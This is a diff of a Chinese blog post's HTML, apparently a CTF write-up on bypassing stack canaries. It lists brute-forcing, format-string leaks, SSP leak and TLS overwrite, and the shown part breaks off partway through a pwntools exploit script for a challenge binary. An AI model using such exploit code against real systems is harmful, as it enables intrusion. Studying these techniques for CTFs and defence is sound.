@@ -1,214 +1,171 @@
-<!DOCTYPE html>
-<html lang=zh>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Canary解决姿势被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~  有问题请指正~❀获取例题请在评论区留言或私信我⭐ 一、canary爆破标志提示就算fork函数吧 多线程开攻 【funcannary】* （1）先运行一下 peda配套checksec                                              根据题目提示’have fun’和’w">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Canary解决姿势 | 幻境</title><meta name="author" content="yub"><meta name="copyright" content="yub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Canary解决姿势被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~  有问题请指正~❀获取例题请在评论区留言或私信我⭐ 一、canary爆破标志提示就算fork函数吧 多线程开攻 【funcannary】* （1）先运行一下 peda配套checksec                                              根据题目提示’have fun’和’">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Canary解决姿势">
 <meta property="og:url" content="https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/index.html">
 <meta property="og:site_name" content="幻境">
-<meta property="og:description" content="Canary解决姿势被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~  有问题请指正~❀获取例题请在评论区留言或私信我⭐ 一、canary爆破标志提示就算fork函数吧 多线程开攻 【funcannary】* （1）先运行一下 peda配套checksec                                              根据题目提示’have fun’和’w">
+<meta property="og:description" content="Canary解决姿势被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~  有问题请指正~❀获取例题请在评论区留言或私信我⭐ 一、canary爆破标志提示就算fork函数吧 多线程开攻 【funcannary】* （1）先运行一下 peda配套checksec                                              根据题目提示’have fun’和’">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg">
+<meta property="og:image" content="https://yubut.github.io/imgs/2024-10/OIP-C.jpg">
 <meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-09-01T09:36:59.089Z">
+<meta property="article:modified_time" content="2024-11-01T16:49:29.726Z">
 <meta property="article:author" content="yub">
-<meta property="article:tag" content="pwn,知识碎片">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="知识碎片">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>Canary解决姿势</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+<meta name="twitter:image" content="https://yubut.github.io/imgs/2024-10/OIP-C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Canary解决姿势',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-02 00:49:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    <!-- Umami Analytics -->
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
-</head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Articles</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Categories</a></li><!--
-     --><!--
-       --><li><a href="/links/">Links</a></li><!--
-     --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%AF%87%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%AC%A6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&text=Canary解决姿势"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&is_video=false&description=Canary解决姿势"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Canary解决姿势&body=Check out this article: https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canary解决姿势"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&name=Canary解决姿势&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&t=Canary解决姿势"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">Canary解决姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81canary%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、canary爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%EF%BC%88-x00%EF%BC%89%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、覆盖截断字符（\x00）获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、利用格式化字符串获取canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSP-Leak%E5%88%A9%E7%94%A8canary"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、SSP Leak利用canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.0.5.</span> <span class="toc-text">五、劫持stack_chk_fail函数泄露canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E6%94%B9TSL%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.0.6.</span> <span class="toc-text">六、修改TSL绕过canary</span></a></li></ol></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        Canary解决姿势
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">yub</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-08-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-09-01</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/" rel="tag">pwn,知识碎片</a>
-    </div>
-
-
-    </div>
-  </header>
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="Canary解决姿势"><a href="#Canary解决姿势" class="headerlink" title="Canary解决姿势"></a><strong>Canary解决姿势</strong></h2><p>被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p>
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('/imgs/2024-10/OIP-C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="幻境"><span class="site-name">幻境</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Canary解决姿势</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-01T16:49:29.726Z" title="更新于 2024-11-02 00:49:29">2024-11-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" data-flag-title="Canary解决姿势"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><hr>
+<h2 id="Canary解决姿势"><a href="#Canary解决姿势" class="headerlink" title="Canary解决姿势"></a><strong>Canary解决姿势</strong></h2><p>被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p>
 <hr>
 <p><u>有问题请指正~</u>❀<br><u>获取例题请在评论区留言或私信我</u>⭐</p>
 <h4 id="一、canary爆破"><a href="#一、canary爆破" class="headerlink" title="一、canary爆破"></a><strong>一、canary爆破</strong></h4><p>标志提示就算fork函数吧 多线程开攻</p>
@@ -227,43 +184,8 @@
 <p>函数入口为0x122D shell返回地址为1329 偏移为0xfc(0x1329-0x122D) 覆盖的buf大小为0x68</p>
 <p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p>
 <p>exp：</p>
-<pre><code class="python">from pwn import *   
-context.arch = &#39;amd64&#39;
-context.os = &#39;linux&#39;
-context.log_level = &#39;debug&#39;
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span 